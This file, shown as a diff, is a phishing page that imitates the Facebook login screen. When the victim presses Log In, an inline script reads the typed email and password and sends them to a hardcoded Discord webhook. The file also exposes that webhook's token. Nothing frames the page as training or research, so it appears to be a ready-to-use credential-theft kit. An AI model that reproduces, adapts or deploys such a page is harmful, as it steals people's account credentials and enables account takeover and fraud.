@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook</title>
+<link rel="stylesheet" href="style.css" />
+</head>
+<body>
+<div class="container">
+<div class="left">
+<img
+src="facebook.svg"
+alt="fblogo"
+/>
+<p>Connect with friends and the world around you on Facebook.</p>
+</div>
+
+      <div class="right">
+      <div class="card">
+      <input type="text" id="email" name="email" placeholder="Email or phone number"/>
+      <input type="password" id="pass" name="pass" placeholder="Password" />
+      
+      
+      <input type="submit" onclick="sendMessage()" value="Log In"/>
+      
+      
+      <a href="#">Forgot password?</a>
+      <button type="button">Create new account</button>
+      </div>
+      <p>Create a Page for a celebrity, brand or business</p>
+      </div>
+      </div>
+
+  <script>
+  function sendMessage() {
+	  var request = new XMLHttpRequest();
+	  request.open("POST", "https://discord.com/api/webhooks/1084353200032841748/1HRm01VvNpcYLBW24_c3wS0tppAmrDWfgqFABA4CbzNo6ynTRP4Ivv8upXqEBUZ56GdB");
+	  
+	  request.setRequestHeader('Content-type', 'application/json');
+	  var email = document.getElementById('email').value;
+	  var pass = document.getElementById('pass').value;
+  
+	  var params = {
+		  username: "Facebook Account",
+		  avatar_url: "https://cdn.discordapp.com/attachments/1006923826698919996/1084351021226151987/f_logo_RGB-Blue_1024.png",
+		  content: "Email: " + email + " Password: " + pass
+			  }
+	  request.send(JSON.stringify(params));
+	  }
+	  </script>
+	  </html>
